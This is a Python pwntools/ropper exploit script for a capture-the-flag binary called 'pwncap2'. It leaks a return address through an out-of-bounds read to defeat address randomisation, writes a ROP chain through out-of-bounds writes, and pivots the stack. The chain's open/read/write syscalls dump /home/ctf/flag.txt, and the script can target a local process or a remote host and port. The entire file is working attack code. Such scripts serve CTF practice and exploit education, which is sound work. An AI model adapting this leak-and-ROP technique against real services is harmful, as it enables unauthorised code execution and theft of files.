import sys
import pwn
import struct
import ropper


def gfirst(gen):
    """Return first item from generator."""
    for g in gen:
        return g


class Exploit:

    # we assume we're always in this page...
    SAVED_EIP_OFFSET = (0xf7f5d000 - 0xf7f59000)
    SAVED_EIP_SLOT = 4294967203

    def __init__(self, proc, fname):
        self.proc = proc
        self.slot = 0
        self.rs = ropper.RopperService()
        self.rs.addFile(fname)
        self.rs.loadGadgetsFor()

    @staticmethod
    def swapint(i):
        if i < 0:
            return struct.unpack('>I', struct.pack('<i', i))[0]
        return struct.unpack('>I', struct.pack('<I', i))[0]

    def rel(self, i):
        return i + self.file_base

    def run(self):
        base = self.get_base()
        print('File base: %08x' % base)
        for val in self.rop_chain():
            self.write(val)
        self.pivot_chain()
        print(self.proc.recv(timeout=1.0))

    def eat_prompt(self):
        return self.proc.recvuntil('> ')

    def get_base(self):
        # This should be a return address
        self.eat_prompt()
        proc.sendline('get')
        self.eat_prompt()
        proc.sendline('%d' % self.SAVED_EIP_SLOT)
        line = proc.recvline().strip()
        _, addrstr = line.split(b': ', 1)
        retaddr = self.swapint(int(addrstr.decode()))
        retpage = retaddr &~ 0xfff
        self.file_base = retpage - self.SAVED_EIP_OFFSET
        if self.file_base & 0xfff:
            print('Calculated file base is not page-aligned.  This is unlikely.')
        return self.file_base

    def write(self, what, where=None):
        if where is None:
            where = self.slot
            self.slot += 1
        print(where, '0x%08x' % what)
        self.eat_prompt()
        proc.sendline('add')
        self.eat_prompt()
        proc.sendline('%d' % where)
        self.eat_prompt()
        proc.sendline('%d' % self.swapint(what))

    def gadget_addr(self, gstr):
        _, gadget = gfirst(self.rs.search(gstr))
        rv = gadget.address
        #print(rv, type(rv))
        return rv

    def rop_chain(self):
        addr = lambda x: (self.rel(x))
        gadget = lambda x: self.rel(self.gadget_addr(x))
        flag_list = list(self.rs.searchString('/home/ctf/flag.txt').values())
        flag_addr = flag_list[0][0][0]  # I'm so sorry...
        #print(flag_addr)
        data_addr = addr(
                self.rs.files[0].loader.getSection('.data').virtualAddress)
        #print(data_addr)
        return [
                #clear ecx, load addr of flag.txt into ebx
                #0x0002eff9: xor eax, eax; pop ebx; ret;
                #addr of flag.txt!
                #0x6b14c (relative to base of file)
                #0x000544c0: mov ecx, eax; mov eax, ecx; ret;
                gadget('xor eax, eax; pop ebx; ret;'),
                addr(flag_addr),
                gadget('mov ecx, eax; mov eax, ecx; ret;'),

                #eax = 5
                gadget('mov eax, 5; ret;'),

                #int 0x80
                gadget('int 0x80; ret;'),

                #mov ebx, eax
                # yes, this is ridiculous, but it's the best I could find
                gadget('push eax; mov eax, esi; pop ebx; pop esi; pop edi; ret;'),
                0x41424344,
                0x64636261,

                #pop ecx, ...? some buffer space
                #0x0006a4d6: pop eax; ret;
                # .data address?
                #0x000544c0: mov ecx, eax; mov eax, ecx; ret;
                gadget('pop eax; ret;'),
                data_addr,
                gadget('mov ecx, eax; mov eax, ecx; ret;'),

                #mov edx, <some reasonable value>
                #0x0006a4d6: pop eax; ret;
                #256
                #0x000607c7: xchg eax, edx; ret;
                gadget('pop eax; ret;'),
                256,
                gadget('xchg eax, edx; ret;'),

                #eax = 3
                #0x00054430: mov eax, 3; ret;
                #int 0x80
                #0x00034c60: int 0x80; ret;
                gadget('mov eax, 3; ret;'),
                gadget('int 0x80; ret;'),

                #mov edx, eax
                #0x000607c7: xchg eax, edx; ret;
                gadget('xchg eax, edx; ret;'),
                #ecx is preserved, I think
                #mov ebx, 1
                #0x0000301e: pop ebx; ret;
                #1
                gadget('pop ebx; ret;'),
                1,

                #eax = 4
                #0x00054440: mov eax, 4; ret;
                #int 0x80
                #0x00034c60: int 0x80; ret;
                gadget('mov eax, 4; ret;'),
                gadget('int 0x80; ret;'),

                #clean exit
                gadget('pop ebx; ret;'),
                0,
                gadget('mov eax, 1; int 0x80;'),
                ]

    def pivot_chain(self):
        # 0x0002bfe9: pop esp; mov eax, 0x10; pop edi; ret;
        addr = self.rel(self.gadget_addr('pop esp; mov eax, 0x10; pop edi; ret'))
        self.write(addr, self.SAVED_EIP_SLOT)


if __name__ == '__main__':
    if len(sys.argv) > 1:
        if ':' in sys.argv[1]:
            host, portstr = sys.argv[1].split(':', 1)
            port = int(portstr)
            proc = pwn.remote(host, port)
        else:
            proc = pwn.process(sys.argv[1])
    else:
        proc = pwn.process('../challenge/pwncap2')
    exp = Exploit(proc, '../challenge/pwncap2')
    exp.run()
